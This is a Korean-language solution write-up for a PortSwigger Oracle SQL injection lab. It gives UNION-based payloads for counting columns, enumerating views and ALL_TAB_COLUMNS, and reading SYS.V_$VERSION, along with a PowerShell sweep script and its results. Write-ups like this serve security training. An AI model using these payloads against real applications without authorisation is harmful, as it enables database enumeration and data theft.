---
title: "SQL injection attack, querying the database type and version on Oracle"
tags:
  - portswigger
  - sql-injection
lab_url: "https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle"
difficulty: Practitioner
note_kind: solution
---

# SQL injection attack, querying the database type and version on Oracle

## 문제 조건과 설명

상품 카테고리 필터에 SQL injection 취약점이 있다. 공식 설명은 주입한 조회 결과를 `UNION`으로 원래 상품 조회에 합칠 수 있다고 알려 준다. 즉 서버 내부에서 쿼리가 실행되는지만 확인하는 문제가 아니라, **추가된 조회 결과를 응답 화면에서 읽을 수 있는** 환경이다.

### 이 문제에서 알아내야 하는 것

**완료 조건은 데이터베이스 버전 문자열을 화면에 표시하는 것**이다. 제목은 Oracle을 대상으로 한다는 단서를 주지만, 버전 값이 들어 있는 객체·열이나 원래 상품 조회의 결과 구조는 알려 주지 않는다. 버전 이름을 추측해서 적는 것과 서버가 반환한 문자열을 실제로 표시하는 것은 다르다.

`UNION`이 성립하려면 원래 조회와 추가 조회의 열 개수가 맞아야 하고, 버전 문자열을 넣을 위치가 문자 데이터를 받을 수 있어야 한다. 따라서 반환 열 수와 화면에 드러나는 문자열 열을 먼저 확인해야 한다. 그다음 접근 가능한 데이터베이스 객체 중 버전 관련 값을 담은 후보를 찾고, **반환된 실제 값**을 화면에서 확인하는 순서가 필요하다. 특정 객체 이름이나 열 이름을 처음부터 알고 있었다고 가정하지 않는다.

아래 기록은 이 판단에 따라 시도한 요청, 500 응답으로 끝난 초기 접근, 이후 검증한 후보 조회를 구분해 적었다. 각각의 결과는 직접 확인한 범위에서만 해석한다.

출처: [PortSwigger 실습 설명](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle)

## 1. 반환 열 수와 문자열 출력 위치 확인

**질문:** `UNION`에 열을 몇 개 맞춰야 하며, 버전 문자열을 어느 열에 출력할 수 있을까?

**실행:**

~~~sql fragment
' ORDER BY 1 --
' ORDER BY 2 --
' ORDER BY 3 --
~~~

1과 2는 처리됐고 3은 HTTP 500이었다. 두 열을 쓰는 `UNION` 요청을 보내 첫 번째 열에 문자열이 표시되는지도 확인했다. 두 번째 열은 `NULL`로 채워 열 수를 맞췄다.

~~~sql fragment
' UNION SELECT view_name, NULL FROM all_views --
~~~

**관찰:** 뷰 이름이 화면에 나왔다.

**판단 → 다음 행동:** 반환 열은 두 개이고 첫 번째 열에 문자열을 출력할 수 있다. 뷰 이름만으로는 소유자와 열을 알 수 없으므로, 메타데이터를 조회한다.

![뷰 이름을 출력한 화면](https://raw.githubusercontent.com/ddomology/portswigger-lab-notes/main/content/labs/sql-injection/images/lab-querying-database-version-oracle/01-union-select-view-names.png)

## 2. 버전 관련 객체를 소유자와 함께 수집

**질문:** 버전 문자열이 들어 있을 만한 객체는 무엇인가?

실습 목표가 버전 조회이므로 먼저 이름에 `VERSION`이 들어간 객체로 범위를 정했다. 데이터베이스 전체를 무작정 조회한 것은 아니다.

**실행:**

~~~sql fragment
' UNION SELECT OWNER || '.' || TABLE_NAME, NULL
FROM ALL_TAB_COLUMNS
WHERE TABLE_NAME LIKE '%VERSION%' --
~~~

**관찰:** 서로 다른 객체 **9개**가 나왔다. `ALL_TAB_COLUMNS`는 열마다 한 행이므로, 객체명만 출력할 때는 중복을 제거하는 `UNION`을 사용했다.

**판단 → 다음 행동:** `OWNER.TABLE_NAME`을 보존한 채 각 객체의 열 이름과 자료형을 확인한다. 이름만 보고 특정 뷰를 정답으로 가정하지 않는다.

~~~sql fragment
' UNION ALL SELECT OWNER || '|' || TABLE_NAME || '|' ||
                   COLUMN_NAME || '|' || DATA_TYPE, NULL
FROM ALL_TAB_COLUMNS
WHERE TABLE_NAME LIKE '%VERSION%' --
~~~

**관찰:** 이 조회에서 9개 객체의 열 **48개**가 확인됐다. 열 정보는 값이 아니므로, 어느 객체에 실제 행이 있고 어느 열에 목표 문구가 있는지는 아직 모른다.

**판단 → 다음 행동:** 아홉 객체 모두의 행 수를 확인한 뒤, 값이 있는 객체의 열을 표식으로 검색한다.

## 3. 9개 객체의 값을 스크립트로 검사

**질문:** 48개 열 중 목표 문자열을 실제로 담은 열은 무엇인가?

실습 설명에 나온 `11.2.0.2.0`을 검색 표식으로 사용했다. [PowerShell 전수 조회 스크립트](https://github.com/ddomology/portswigger-lab-notes/blob/main/scripts/oracle-version-sweep.ps1)는 위 메타데이터에서 객체·열을 받아 **소유자 포함 이름**으로 요청을 만든다.

~~~powershell
pwsh -File .\scripts\oracle-version-sweep.ps1 `
  -BaseUrl 'https://YOUR-LAB.web-security-academy.net' `
  -Marker '11.2.0.2.0' `
  -OutputPath 'version-sweep.json'
~~~

스크립트는 먼저 객체마다 `COUNT(*)`를 조회한다. 행이 0개인 객체 네 곳은 값 검색을 건너뛰고, 나머지 다섯 객체의 **17개 열**에서 표식이 들어간 값을 찾는다. 출력은 열당 최대 20건으로 제한한다.

| 소유자 포함 객체 | 행 수 | `11.2.0.2.0` 일치 결과 |
| --- | ---: | --- |
| `SYS.ALL_FILE_GROUP_VERSIONS` | 0 | 없음 |
| `SYS.ALL_TYPE_VERSIONS` | 10,191 | 없음 |
| `SYS.GV_$VERSION` | 5 | `BANNER` 5행 |
| `SYS.PRODUCT_COMPONENT_VERSION` | 4 | `VERSION` 4행 |
| `SYS.SM_$VERSION` | 1 | 없음 |
| `SYS.USER_FILE_GROUP_VERSIONS` | 0 | 없음 |
| `SYS.USER_TYPE_VERSIONS` | 0 | 없음 |
| `SYS.V_$VERSION` | 5 | `BANNER` 5행 |
| `SYS._ALL_FILE_GROUP_VERSIONS` | 0 | 없음 |

**관찰:** 총 14개 행이 표식과 일치했다. `PRODUCT_COMPONENT_VERSION.VERSION`의 네 행은 버전 번호만 보여줬다. 반면 `GV_$VERSION.BANNER`와 `V_$VERSION.BANNER`는 실습 설명의 **완전한 문자열 다섯 개**를 각각 반환했다. `ALL_TYPE_VERSIONS`의 묶음 요청은 HTTP 400이어서 스크립트가 그 객체의 8개 열을 개별 재시도했고, 모두 200·일치값 없음으로 확인했다.

**판단 → 다음 행동:** 제품 버전 번호만 있는 열보다 전체 문구가 있는 `BANNER`가 목표에 맞다. 후보 하나를 직접 출력하고 실습 판정을 확인한다.

## 4. 찾은 열을 직접 출력해 판정 확인

**실행:**

~~~sql fragment
' UNION ALL SELECT "BANNER", NULL FROM "SYS"."V_$VERSION" --
~~~

**관찰:** HTTP 200으로 다음 다섯 행이 출력됐고, 실습 상태가 **LAB Solved**로 바뀌었다.

~~~text
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
PL/SQL Release 11.2.0.2.0 - Production
CORE 11.2.0.2.0 Production
TNS for Linux: Version 11.2.0.2.0 - Production
NLSRTL Version 11.2.0.2.0 - Production
~~~

**판단:** 메타데이터에서 출발해 9개 후보를 검사한 결과와 실제 `Solved` 판정이 일치했다.

## 초기 시도와 HTTP 500에서 배운 점

처음에는 `PRODUCT_COMPONENT_VERSION`의 `PRODUCT`·`VERSION`·`STATUS`를 합쳐 네 행을 출력했다. 버전 번호는 확인했지만 `CORE` 행이 없고 화면은 **Not solved**였다. 따라서 구분자를 고치는 것만으로는 부족하다고 판단했다.

~~~sql fragment
' UNION SELECT PRODUCT || ' | ' || VERSION || ' | ' || STATUS, NULL
FROM PRODUCT_COMPONENT_VERSION --
~~~

![네 행이 표시됐지만 Not solved인 화면](https://raw.githubusercontent.com/ddomology/portswigger-lab-notes/main/content/labs/sql-injection/images/lab-querying-database-version-oracle/03-product-component-version-not-solved.png)

초기 반복 조회에서는 `OWNER`를 저장하지 않아 `FROM "V_$VERSION"`처럼 참조했고, 문자열 조회와 `COUNT(*)`가 모두 HTTP 500이었다. 같은 객체를 `FROM "SYS"."V_$VERSION"`으로 조회하면 행 수 5와 `BANNER`가 정상 반환됐다. **소유자 포함 이름으로 재시도해 문제를 해결했지만**, 응답이 Oracle 오류 번호를 숨겼으므로 정확한 `ORA-` 코드는 알 수 없다. 위의 9개 객체 전수 조회는 이 시행착오 후에 같은 방식으로 재검증한 결과다.

## 참고

- [Oracle: ALL_TAB_COLUMNS의 OWNER 열](https://docs.oracle.com/cd/E18283_01/server.112/e17110/statviews_2103.htm)
